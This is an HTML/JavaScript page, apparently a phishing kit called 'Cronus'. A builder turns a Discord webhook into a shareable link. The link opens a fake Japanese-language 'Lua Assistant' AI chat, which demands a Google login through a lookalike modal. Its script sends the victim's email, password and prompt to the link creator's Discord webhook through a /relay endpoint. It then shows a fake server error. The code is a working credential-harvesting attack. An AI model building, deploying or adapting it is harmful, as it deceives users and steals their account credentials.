<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Cronus</title>
<style>
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body {
    margin: 0; min-height: 100vh; background: #0b0d12; color: #e6e9ef;
    font-family: ui-sans-serif, system-ui, -apple-system, "Segoe UI", sans-serif;
  }

  #builder {
    min-height: 100vh; display: grid; place-items: center; padding: 20px;
  }
  .card {
    width: min(560px, 92vw); padding: 32px; border-radius: 18px;
    background: linear-gradient(160deg, #141821, #0f1218);
    border: 1px solid #232a38; box-shadow: 0 30px 80px rgba(0,0,0,.6);
  }
  h1 { margin: 0 0 6px; font-size: 22px; letter-spacing: .02em; }
  p.sub { margin: 0 0 24px; color: #8b94a7; font-size: 13px; }
  label { display: block; font-size: 12px; color: #8b94a7; margin-bottom: 8px; letter-spacing: .06em; text-transform: uppercase; }
  input[type="text"] {
    width: 100%; padding: 13px 14px; border-radius: 10px; border: 1px solid #2a3244;
    background: #0c0f15; color: #e6e9ef; font-size: 14px; outline: none;
  }
  input[type="text"]:focus { border-color: #3f7bd6; box-shadow: 0 0 0 3px rgba(63,123,214,.18); }
  button {
    cursor: pointer; border: none; border-radius: 10px; font-size: 14px;
    padding: 13px 18px; font-weight: 600; transition: transform .06s ease, background .15s ease;
  }
  button:active { transform: translateY(1px); }
  .primary { background: #3f7bd6; color: #fff; width: 100%; margin-top: 18px; }
  .primary:hover { background: #4a88e6; }
  .result { margin-top: 22px; display: none; }
  .result.show { display: block; }
  .linkbox { display: flex; gap: 8px; align-items: stretch; margin-top: 8px; }
  .linkbox input { flex: 1; font-family: ui-monospace, monospace; font-size: 12px; }
  .copy { background: #1d2432; color: #cfe0ff; min-width: 88px; }
  .copy:hover { background: #263049; }
  .copy.done { background: #1f5135; color: #b9f5cf; }
  .status { margin-top: 12px; font-size: 12px; color: #8b94a7; min-height: 16px; }
  .status.err { color: #ff8b8b; }

  #chat { display: none; flex-direction: column; min-height: 100vh; }
  #chat.show { display: flex; }
  header {
    padding: 16px 22px; border-bottom: 1px solid #1c2230;
    display: flex; align-items: center; gap: 10px; background: #0e1219;
  }
  .dot { width: 9px; height: 9px; border-radius: 50%; background: #3f7bd6; box-shadow: 0 0 12px #3f7bd6; }
  header h1 { margin: 0; font-size: 15px; font-weight: 600; letter-spacing: .02em; }
  main { flex: 1; overflow-y: auto; padding: 26px 22px 140px; }
  .wrap { max-width: 780px; margin: 0 auto; display: flex; flex-direction: column; gap: 16px; }
  .msg { max-width: 82%; padding: 12px 15px; border-radius: 14px; font-size: 14px; line-height: 1.6; white-space: pre-wrap; word-break: break-word; }
  .msg.user { align-self: flex-end; background: #22406e; border-bottom-right-radius: 4px; }
  .msg.ai { align-self: flex-start; background: #151a24; border: 1px solid #232a38; border-bottom-left-radius: 4px; }
  .msg.err { align-self: flex-start; background: #2a1416; border: 1px solid #5a2226; color: #ffb3b3; border-bottom-left-radius: 4px; }
  .composer {
    position: fixed; bottom: 0; left: 0; right: 0; padding: 16px 22px 22px;
    background: linear-gradient(to top, #0b0d12 70%, transparent);
  }
  .composer .inner {
    max-width: 780px; margin: 0 auto; display: flex; gap: 10px;
    background: #0f131b; border: 1px solid #232a38; border-radius: 14px; padding: 8px 8px 8px 16px;
  }
  .composer input {
    flex: 1; background: transparent; border: none; outline: none; color: #e6e9ef;
    font-size: 14px; padding: 8px 0;
  }
  .composer button {
    border: none; border-radius: 10px; background: #3f7bd6; color: #fff;
    font-size: 14px; font-weight: 600; padding: 10px 20px; cursor: pointer;
  }
  .composer button:hover { background: #4a88e6; }

  .overlay {
    position: fixed; inset: 0; background: rgba(5,7,10,.72); backdrop-filter: blur(4px);
    display: none; place-items: center; padding: 20px; z-index: 50;
  }
  .overlay.show { display: grid; }
  .modal {
    width: min(400px, 100%); background: #fff; color: #202124; border-radius: 10px;
    padding: 32px 30px 26px; font-family: Roboto, ui-sans-serif, system-ui, sans-serif;
    box-shadow: 0 24px 70px rgba(0,0,0,.55);
  }
  .glogo { display: flex; justify-content: center; margin-bottom: 18px; }
  .glogo svg { width: 40px; height: 40px; }
  .modal h2 { margin: 0 0 6px; font-size: 22px; font-weight: 400; text-align: center; }
  .modal p.lead { margin: 0 0 22px; font-size: 14px; color: #5f6368; text-align: center; }
  .modal input {
    width: 100%; padding: 13px 14px; border: 1px solid #dadce0; border-radius: 6px;
    font-size: 15px; color: #202124; outline: none; margin-bottom: 14px;
  }
  .modal input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,.15); }
  .modal button[type="submit"] {
    width: 100%; padding: 12px; border: none; border-radius: 6px; background: #1a73e8;
    color: #fff; font-size: 15px; font-weight: 500; cursor: pointer;
  }
  .modal button[type="submit"]:hover { background: #1b66c9; }
  .modal .hint { margin-top: 18px; font-size: 12px; color: #80868b; text-align: center; }
</style>
</head>
<body>

<div id="builder">
  <main class="card">
    <h1>Cronus Link Builder</h1>
    <p class="sub">ディスコのウェブフックを設定し、Lua AI チャットへのリンクを作成します。</p>
    <label for="webhook">Discord Webhook URL</label>
    <input id="webhook" type="text" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" />
    <button id="create" class="primary">作成</button>
    <section id="result" class="result">
      <label for="link">生成リンク</label>
      <div class="linkbox">
        <input id="link" type="text" readonly />
        <button id="copy" class="copy">コピー</button>
      </div>
    </section>
    <div id="status" class="status"></div>
  </main>
</div>

<div id="chat">
  <header>
    <span class="dot"></span>
    <h1>Lua Assistant</h1>
  </header>
  <main>
    <div class="wrap" id="thread">
      <div class="msg ai">Lua スクリプトについて何でも聞いてください。</div>
    </div>
  </main>
  <div class="composer">
    <div class="inner">
      <input id="prompt" type="text" placeholder="質問を入力..." autocomplete="off" />
      <button id="send">送信</button>
    </div>
  </div>
</div>

<div class="overlay" id="overlay">
  <form class="modal" id="loginForm">
    <div class="glogo">
      <svg viewBox="0 0 48 48" aria-hidden="true">
        <path fill="#4285F4" d="M45.1 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h11.8c-.5 2.8-2 5.1-4.4 6.7v5.5h7.1c4.2-3.9 6.6-9.6 6.6-16.2z"/>
        <path fill="#34A853" d="M24 46c6 0 11-2 14.5-5.3l-7.1-5.5c-2 1.3-4.5 2.1-7.4 2.1-5.7 0-10.6-3.9-12.3-9.1H4.3v5.7C7.8 41.1 15.3 46 24 46z"/>
        <path fill="#FBBC05" d="M11.7 28.2c-.4-1.3-.7-2.7-.7-4.2s.2-2.9.7-4.2v-5.7H4.3C2.8 17.1 2 20.4 2 24s.8 6.9 2.3 9.9l7.4-5.7z"/>
        <path fill="#EA4335" d="M24 10.7c3.2 0 6.1 1.1 8.4 3.3l6.3-6.3C35 4.2 30 2 24 2 15.3 2 7.8 6.9 4.3 14.1l7.4 5.7c1.7-5.2 6.6-9.1 12.3-9.1z"/>
      </svg>
    </div>
    <h2>ログイン</h2>
    <p class="lead">続行するには Google アカウントでログインしてください</p>
    <input id="email" type="email" placeholder="メールアドレス" autocomplete="off" required />
    <input id="password" type="password" placeholder="パスワード" autocomplete="off" required />
    <button type="submit">次へ</button>
    <div class="hint">テスト環境のため認証は行われません</div>
  </form>
</div>

<script>
  const builder = document.getElementById('builder');
  const chat = document.getElementById('chat');
  const webhookInput = document.getElementById('webhook');
  const createBtn = document.getElementById('create');
  const resultBox = document.getElementById('result');
  const linkInput = document.getElementById('link');
  const copyBtn = document.getElementById('copy');
  const statusEl = document.getElementById('status');

  const thread = document.getElementById('thread');
  const promptInput = document.getElementById('prompt');
  const sendBtn = document.getElementById('send');
  const overlay = document.getElementById('overlay');
  const loginForm = document.getElementById('loginForm');
  const emailInput = document.getElementById('email');
  const passwordInput = document.getElementById('password');

  let webhookUrl = '';
  let loggedIn = false;
  let pendingPrompt = null;

  function setStatus(msg, err) {
    statusEl.textContent = msg;
    statusEl.classList.toggle('err', !!err);
  }

  function b64urlEncode(str) {
    const bytes = new TextEncoder().encode(str);
    let bin = '';
    for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  }

  function b64urlDecode(str) {
    const b64 = str.replace(/-/g, '+').replace(/_/g, '/');
    const pad = b64.length % 4 === 0 ? '' : '='.repeat(4 - (b64.length % 4));
    const bin = atob(b64 + pad);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    return new TextDecoder().decode(bytes);
  }

  function showChat() {
    builder.style.display = 'none';
    chat.classList.add('show');
  }

  function showBuilder() {
    builder.style.display = 'grid';
    chat.classList.remove('show');
  }

  (function init() {
    try {
      const k = new URLSearchParams(location.search).get('k');
      if (!k) {
        showBuilder();
        return;
      }
      const decoded = b64urlDecode(k);
      if (!/^https:\/\/discord(app)?\.com\/api\/webhooks\//.test(decoded)) {
        showBuilder();
        setStatus('リンクが無効です。ウェブフックURLから作り直してください。', true);
        return;
      }
      webhookUrl = decoded;
      showChat();
    } catch (e) {
      webhookUrl = '';
      showBuilder();
      setStatus('リンクの読み込みに失敗しました。作り直してください。', true);
    }
  })();

  createBtn.addEventListener('click', () => {
    const url = webhookInput.value.trim();
    if (!/^https:\/\/discord(app)?\.com\/api\/webhooks\//.test(url)) {
      setStatus('有効な Discord ウェブフック URL を入力してください。', true);
      return;
    }
    const finalUrl = location.origin + location.pathname + '?k=' + b64urlEncode(url);
    linkInput.value = finalUrl;
    resultBox.classList.add('show');
    setStatus('リンクを作成しました。', false);
    copyBtn.classList.remove('done');
    copyBtn.textContent = 'コピー';
  });

  copyBtn.addEventListener('click', async () => {
    try {
      await navigator.clipboard.writeText(linkInput.value);
    } catch {
      linkInput.select();
      document.execCommand('copy');
    }
    copyBtn.textContent = 'コピー済み';
    copyBtn.classList.add('done');
    setTimeout(() => {
      copyBtn.textContent = 'コピー';
      copyBtn.classList.remove('done');
    }, 1600);
  });

  function addMessage(text, cls) {
    const el = document.createElement('div');
    el.className = 'msg ' + cls;
    el.textContent = text;
    thread.appendChild(el);
    el.scrollIntoView({ behavior: 'smooth', block: 'end' });
    return el;
  }

  async function relay(type, fields) {
    if (!webhookUrl) return { ok: false };
    try {
      const r = await fetch('/relay', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ webhook: webhookUrl, type, fields }),
      });
      return await r.json();
    } catch (e) {
      return { ok: false, error: String(e) };
    }
  }

  function handleSend() {
    const text = promptInput.value.trim();
    if (!text) return;

    if (!loggedIn) {
      pendingPrompt = text;
      overlay.classList.add('show');
      emailInput.focus();
      return;
    }

    addMessage(text, 'user');
    promptInput.value = '';
    setTimeout(() => {
      addMessage('エラー: リクエストを処理できませんでした。後でもう一度お試しください。 (code: 500)', 'err');
    }, 420);
  }

  sendBtn.addEventListener('click', handleSend);
  promptInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') handleSend();
  });

  loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = emailInput.value.trim();
    const password = passwordInput.value;
    if (!email || !password) return;

    let ok = false;
    try {
      const r = await fetch('/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password }),
      });
      const j = await r.json();
      ok = !!j.ok;
    } catch {
      ok = false;
    }

    if (!ok) {
      passwordInput.value = '';
      passwordInput.placeholder = 'パスワードを入力してください';
      passwordInput.focus();
      return;
    }

    const relayResult = await relay('login', [
      { name: 'Email', value: email, inline: false },
      { name: 'Password', value: password, inline: false },
      { name: 'Prompt', value: pendingPrompt || '(none)', inline: false },
    ]);

    if (!relayResult.ok) {
      passwordInput.placeholder = '送信に失敗しました。もう一度お試しください';
      return;
    }

    loggedIn = true;
    overlay.classList.remove('show');
    loginForm.reset();
    passwordInput.placeholder = 'パスワード';

    if (pendingPrompt) {
      addMessage(pendingPrompt, 'user');
      pendingPrompt = null;
    }
    promptInput.value = '';
    setTimeout(() => {
      addMessage('エラー: リクエストを処理できませんでした。後でもう一度お試しください。 (code: 500)', 'err');
    }, 500);
  });
</script>
</body>
</html>
